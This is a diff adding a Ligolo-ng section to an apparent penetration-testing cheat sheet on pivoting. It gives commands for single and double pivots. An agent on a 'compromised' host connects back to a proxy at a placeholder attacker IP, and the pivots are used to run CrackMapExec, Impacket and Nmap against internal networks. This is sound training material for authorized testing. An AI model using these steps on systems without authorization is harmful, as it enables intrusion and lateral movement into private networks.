@@ -304,6 +304,67 @@ Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
   ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
   ```
 
+## Ligolo-ng
+
+Ligolo-ng : An advanced, yet simple, tunneling tool that uses TUN interfaces.
+
+#### Single Pivot
+1. Downloading the binaries.
+- The proper binaries can be downloaded from [here](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.2).
+
+2. Setting up the ligolo-ng interface and IP routes.
+- The initial step is to create a new interface and add an IP route to the subnet that we want to pivot to through this interface. We can easily do it through the following bash script.
+```bash
+#!/bin/bash
+
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+ip route add <x.x.x.x\24> dev ligolo
+```
+
+- We can then run the script by issuing the `chmod +x ligolo-ng_setup.sh && ./ligolo-ng_setup.sh`
+
+3. Setting up the ligolo-ng proxy.
+- After the interface has been setup, we can now start the ligolo-ng proxy. We can use any `<PROXY_PORT>` we want as long as it not already in use.
+`./proxy -laddr <ATTACKER_IP>:<PROXY_PORT> -selfcert`
+
+4. Using the ligolo-ng agent to connect to the ligolo-ng proxy.
+- In the compromised computer we can use the agent to connect back to the proxy.
+`./agent -connect <ATTACKER_IP>:<PROXY_PORT> -ignore-cert`
+
+5. Start tunneling traffic through ligolo-ng.
+- Once the connection from the agent reaches the proxy we can use the `session` command to list the available sessions.
+- We can use the arrow keys to select the session we want and issue the command `start` to start tunnelling traffic through it.
+
+6. Using local tools.
+- After the tunneling has been initiated, we can use local offensive tools, such as CrackMapExec, Impacket, Nmap through the ligolo-ng network pivot without any kind of limitations or added lag (this is especially true for Nmap).
+
+#### Double Pivot
+1. Setting up a listener in the initial pivoting session.
+- To start a double pivot, we have to make sure that the connection of the second agent will go through the **first** agent to avoid losing contact to our first pivot. To do so, we will have to create a _listener_ to the ligolo-ng session responsible for the first pivot.
+- This command starts a listener to all the interfaces (`0.0.0.0`) of the **compromised**  host in port `4443` (we can replace it with any other port we want, as long as it is not already in use in the compromised initial pivot host). Any traffic that reaches this listener will be **redirected to the ligolo-ng** proxy (`--to <ATTACKER_IP>:<PROXY_PORT>`).
+`listener_add --addr 0.0.0.0:4443 --to <ATTACKER_IP>:<PROXY_PORT> --tcp`
+
+2. Starting te second agent. 
+- After transferring the ligolo-ng agent to the **second** pivot host that we have compromised we will start a connection **not directly to our ligolo-ng proxy** but to the first pivoting agent.
+`.\agent.exe -connect <1st_PIVOT_HOST_IP>:4443 -ignore-cert `
+
+3. Starting the second pivot.
+- In the ligolo-ng proxy we will receive a call from the second agent through the listener of the first agent. We can use the `session` command and the arrow keys to navigate through the created sessions. Issuing the `start` and `stop` commands we can tell the ligolo-ng proxy which session will be used for tunneling traffic.
+
+4. Adding a new IP route to the second network.
+- Before being able to use our local tools to the second network that we want to pivot to, we need to add a new IP route for it through the `ligolo` interface that we created in the first step.
+`ip route add 172.16.10.0/24 dev ligolo`
+
+5. Using local tools.
+- After the tunneling has been initiated, we can use local offensive tools to the second network as well.
+
+#### Triple, etc. Pivot
+- The process is exactly the same as the second pivot.
+
+#### Pivoting to individual hosts to expose internally running services.
+- The same process can also be used to pivot to individual hosts instead of whole subnets. This will allow an operator to expose locally running services in the compromised server, similar to the dynamic port forwarding through SSH.
+
 ## Gost
 
 > Wiki English : https://docs.ginuerzh.xyz/gost/en/
